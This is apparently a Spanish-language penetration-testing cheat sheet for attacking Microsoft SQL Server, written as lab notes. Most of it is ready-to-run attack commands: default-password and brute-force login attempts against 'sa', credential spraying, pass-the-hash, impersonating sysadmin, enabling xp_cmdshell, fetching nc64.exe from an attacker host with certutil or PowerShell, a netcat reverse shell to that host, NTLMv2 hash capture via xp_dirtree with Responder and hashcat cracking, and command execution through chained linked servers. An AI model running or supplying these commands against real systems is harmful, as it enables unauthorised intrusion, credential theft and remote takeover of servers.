# Microsoft SQL Server (1433)

Tags: #MSSQL #SQLServer #Windows #DC #RCE #HashCapture #NTLMRelay #Impersonacion #LinkedServers

## OBJETIVO

- Validar acceso desde fuera y desde dentro del servidor
- Enumerar usuarios, bases de datos y permisos
- Obtener RCE vía xp_cmdshell
- Capturar hash NTLMv2 para crackear offline
- Escalar dentro de MSSQL via impersonación y linked servers

## TIPS

1. **Siempre probar autenticación Windows (-windows-auth) Y SQL → una puede funcionar cuando la otra no**
2. **xp_cmdshell deshabilitado por defecto → solo sysadmin puede habilitarlo**
3. **xp_dirtree apuntando a tu IP → captura hash NTLMv2 sin necesidad de RCE**
4. **NT Authority\System puede conectarse al MSSQL local sin credenciales**
5. **Responder ANTES de ejecutar xp_dirtree → si lo haces al revés no capturas nada**
6. **Impersonación → si puedes actuar como SA → xp_cmdshell aunque no seas sysadmin**

## TOOLS

- [Impacket-mssqlclient](https://github.com/fortra/impacket)
- [NetExec](https://github.com/Pennyw0rth/NetExec)
- [Responder](https://github.com/lgandx/Responder)
- [sqsh](https://sourceforge.net/projects/sqsh/)
- [Hashcat](https://hashcat.net/hashcat/)

# DESDE FUERA DEL SERVIDOR (ACCESO REMOTO)

## 1. PROBAR ACCESO CON USUARIO SA (POR DEFECTO) Y VALIDACIÓN CON CREDENCIALES CONOCIDAS

```bash
# sa → System Administrator → usuario por defecto de MSSQL
# Frecuentemente habilitado con contraseña débil o vacía

❯ nxc mssql ❮IP❯ -u 'sa' -p ''
❯ nxc mssql ❮IP❯ -u 'sa' -p '' --local-auth
# Sin contraseña → el más común en instalaciones mal configuradas

❯ nxc mssql ❮IP❯ -u 'sa' -p 'sa' 
❯ nxc mssql ❮IP❯ -u 'sa' -p 'admin' 
❯ nxc mssql ❮IP❯ -u 'sa' -p 'Password1' 
❯ nxc mssql ❮IP❯ -u 'sa' -p 'password' 
# Contraseñas comunes para sa → probar siempre antes de fuerza bruta


IMPORTANTE 
	- [Pwn3d!] → sa está habilitado y eres sysadmin → xp_cmdshell disponible
```

```bash
❯ nxc mssql ❮IP❯ -u 'user' -p 'pass' 
❯ nxc mssql ❮IP❯ -u 'user' -p 'pass' --local-auth
# Autenticación SQL local → no requiere dominio

❯ nxc mssql ❮IP❯ -u 'user' -p 'pass' -d domain.corp
# Autenticación Windows con dominio → más común en AD

❯ nxc mssql ❮IP❯ -u 'user' -H 'NThash' -d domain.corp
# Pass-the-Hash → sin contraseña en claro


IMPORTANTE:
	- [Pwn3d!] → sysadmin → xp_cmdshell directo
	- Sin [Pwn3d!] pero con acceso → enumerar y buscar impersonación
```

### 1a. Fuerza bruta 
```bash 
❯ nxc mssql ❮IP❯ -u 'sa' -p /usr/share/seclists/Passwords/Common-Credentials/best110.txt 
❯ nxc mssql ❮IP❯ -u 'sa' -p /usr/share/seclists/Passwords/Common-Credentials/best110.txt --local-auth
# Fuerza bruta al sa con wordlist corta → más rápido

❯ nxc mssql ❮IP❯ -u users.txt -p passwords.txt --continue-on-success
# Spraying de credenciales
```

### 1b. Si se trae el puerto por medio de un Pivot (Chisel) - VALIDACIÓN
```bash 
❯ nxc mssql 127.0.0.1 -u 'user' -p 'pass' 
❯ nxc mssql 127.0.0.1 -u 'user' -p 'pass' --local-auth
```

## 2. CONEXIÓN Y AUTENTICACIÓN

```bash
# Si el puerto esta expuesto en el server  
# Autenticación Windows (dominio) → más común en AD
❯ impacket-mssqlclient domain01.corp/'user:passwd'@❮IP❯ -windows-auth     <- IMPORTANTE 

# Puerto no estándar
❯ impacket-mssqlclient domain.corp/'user:passwd'@❮IP❯ -windows-auth -port 1433
```

```bash 
# Autenticación SQL local con el usuario → sa 
❯ impacket-mssqlclient 'sa:passwd'@❮IP❯

# sqsh → alternativa cuando impacket falla
❯ sqsh -S ❮IP❯ -U 'user' -P 'passwd'
	# Los comandos en sqsh terminan con 'go' para ejecutarse


IMPORTANTE:
	- [Pwn3d!] → sysadmin → xp_cmdshell directo
	- Sin [Pwn3d!] pero con acceso → enumerar y buscar impersonación
```

### 2a. Si se trae el puerto por medio de un Pivot (Chisel) - AUTENTICACIÓN 

```bash 
❯ impacket-mssqlclient 'user:passwd'@127.0.0.1 -windows-auth      <- IMPORTANTE

❯ impacket-mssqlclient domain01.corp/'user:passwd'@127.0.0.1 -windows-auth      <- IMPORTANTE 
❯ impacket-mssqlclient domain01.corp/'user:passwd'@localhost -windows-auth 

❯ sqsh -S 127.0.0.1 -U 'Domain.corp\user' -P 'passwd'
```

### 2b. Si ingreso a la DB y no soy SysAdmin, verificar si se puede IMPERSONAR 

```bash 
Paso 0:
# Impersonación → actuar como otro usuario con más privilegios
# Muy común en entornos mal configurados → jon.snow puede ser samwel.tarlly → SA


❯ SELECT * FROM sys.server_permissions WHERE permission_name = 'IMPERSONATE'
# Ver todos los permisos de impersonación disponibles

# Verificar si puedo impersonar a alguien
❯ SELECT DISTINCT b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE';    # Si devuelve usuarios, entonces puedo impersonarlos

# Impersonar el usuario encontrado
❯ exec_as_login sa      # Si se tiene el permiso cambiará al user SA → SYSADMIN
❯ SELECT SYSTEM_USER    # Confirmar que ahora soy ''SA' → Sysadmin

❯ SELECT IS_SRVROLEMEMBER('sysadmin')
# 1 → el usuario impersonado es SA → puedo usar xp_cmdshell

# Volver al usuario original
❯ REVERT
```

### 2c. OBTENER REVERSE SHELL (ESCALADA)

```bash
IMPORTANTE
	- [Pwn3d!] → sysadmin → xp_cmdshell directo
	- Requiere xp_cmdshell habilitado → ser sysadmin o impersonar SA


Paso 1:
❯ SELECT IS_SRVROLEMEMBER('sysadmin')
# 1 → soy sysadmin | 0 → no lo soy
# Determina si puedo habilitar xp_cmdshell

Paso 2:
# Activarlo en caso de ser necesario 
❯ EXEC sp_configure 'show advanced options', 1;
❯ RECONFIGURE;

❯ EXEC sp_configure 'xp_cmdshell', 1;
❯ RECONFIGURE;
# Activar xp_cmdshell 

Paso 3:
# comprobar si quedo habilitado 
❯ EXEC sp_configure 'xp_cmdshell';

# Se debería ver config_value y run_value en 1
name          minimum   maximum   config_value   run_value   
-----------   -------   -------   ------------   ---------   
xp_cmdshell         0         1              1           1  

Paso 4:
# Ejecutar comandos
❯ EXEC xp_cmdshell 'whoami';
❯ EXEC xp_cmdshell 'hostname';
```

```bash 
# REVERSHELL
Paso 1:
# Crear directorio temporal si no existe
❯ xp_cmdshell "mkdir C:\Temp"


# Paso 2 → Descargar nc64.exe desde Kali
❯ EXEC xp_cmdshell 'certutil -urlcache -split -f http://❮IP_KALI❯/nc64.exe C:\temp\nc64.exe'
# Antes: 
	python3 -m http.server 80   # Compartir el Netcat desde Kali 

# Alternativa a certutil
❯ xp_cmdshell 'powershell -c "IEX(New-Object Net.WebClient).DownloadFile(\"http://❮IP_KALI❯/nc64.exe\",\"C:\temp\nc64.exe\")"'


# Paso 3 → Ejecutar reverse shell
❯ EXEC xp_cmdshell 'C:\temp\nc64.exe -e cmd.exe ❮IP_KALI❯ 443'
# Antes: 
	penelope -p 443       # Recibir la revershell en Kali  
	rlwrap nc -nlvp 443   # Recibir la revershell en Kali
```


## 3. CAPTURA DE HASH NTLMv2 (SIN RCE) (ESCALAR)

### 3a. Con Responder
```bash
# PASO 1 → Responder PRIMERO en Kali
❯ responder -I tun0

# PASO 2 → Dentro de mssqlclient
❯ xp_dirtree \\IP_Kali\test      # Consultar un recurso que no existe en Kali desde la DB
# Autentica automáticamente → captura el hash NTLMv2

# PASO 3 → Crackear
❯ hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
```
### 3b. Con sqsh
```bash
Paso 1:
❯ responder -I tun0

Paso 2:
❯ sqsh -S ❮IP❯ -U 'Domain.corp\user' -P 'passwd'   # Ingresaar a la DB
❯ xp_dirtree '\\❮IP_KALI❯\test'                    # Concultar un recurso inexistente en Kali  
❯ go    # Ejecutar el comando 

Paso 3:
❯ hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt   # Crackear el hash obtenido 
```
### 3c. Con impacket-smbserver
```bash
Paso 1:
❯ impacket-smbserver smbFolder $(pwd) -smb2support
# En Kali → levantar servidor SMB

Paso 2:
❯ xp_dirtree \\❮IP_KALI❯\smbFolder\test
# Ejecutra dentro de mssqlclient para que el smbserver capture el hash 

Paso 3:
❯ hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt   # Crackear el hash obtenido 
```


## 4. ENUMERACIÓN DENTRO DEL MSSQL 

```bash
# Dentro de impacket-mssqlclient
❯ impacket-mssqlclient domain01.corp/'user:passwd'@❮IP❯ -windows-auth     # Ingresar a MSSQL desde el cliente en Kali 

	❯ help              # Ver todos los comandos disponibles de impacket
	
	# Mostrar las DBs visibles para tu login
	❯ SELECT name FROM sys.databases;    
	
	❯ USE <DB_Name>;    # Cambiar a una base de datos
	
	# Mostrar las tablas de la base seleccionada
	❯ SELECT * FROM INFORMATION_SCHEMA.TABLES;
	❯ SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_CATALOG='DB_Name';
	❯ SELECT TABLE_SCHEMA, TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_TYPE = 'BASE TABLE';   
	
    # Ver los datos de unaa tabla 
	❯ SELECT * FROM tabla_nombre;
	❯ SELECT * FROM dbo.<Table_Name>;  
	❯ SELECT * FROM usuarios;
	❯ SELECT * FROM sysusers;
	❯ SELECT * FROM accounts;   
	
	# Consultas específicas
	❯ SELECT name FROM sys.databases WHERE name NOT IN ('master', 'tempdb', 'model', 'msdb');
	❯ SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_NAME LIKE '%user%' OR TABLE_NAME LIKE '%account%' OR TABLE_NAME LIKE '%admin%';
	❯ SELECT COLUMN_NAME, DATA_TYPE FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = 'nombre_tabla';
	
	# Enumerar directorios desde la DB  
	❯ xp_dirtree C:\Users\              # Explorar sistema de archivos sin necesitar xp_cmdshell
	❯ xp_dirtree C:\inetpub\wwwroot\    # Raíz IIS → buscar configs con credenciales
```


## 5. LINKED SERVERS — PIVOTAR A OTRO SERVIDOR SQL

```bash
# Linked servers → este servidor tiene conexión a otro servidor MSSQL
# Permite ejecutar queries en el servidor remoto

# Ver linked servers disponibles
❯ SELECT * FROM sys.servers
❯ SELECT * FROM sys.linked_logins
# Ver con qué usuario se conecta al servidor remoto

# Ejecutar comando en el linked server
❯ EXEC('xp_cmdshell ''whoami''') AT braavos
# 'braavos' → nombre del linked server

❯ EXEC('SELECT @@version') AT braavos
# Verificar conectividad con el linked server

❯ EXEC('SELECT IS_SRVROLEMEMBER(''sysadmin'')') AT braavos
# Ver si el usuario tiene SA en el servidor remoto

# Si tienes SA en el linked server → xp_cmdshell remoto
❯ EXEC('EXEC xp_cmdshell ''whoami''') AT braavos
# RCE en el servidor remoto sin comprometerlo directamente

# Cadena de linked servers → linked server de linked server
❯ EXEC('EXEC(''xp_cmdshell ''''whoami'''''') AT braavos') AT castelblack
# Ejecutar en un tercer servidor a través de dos saltos
```

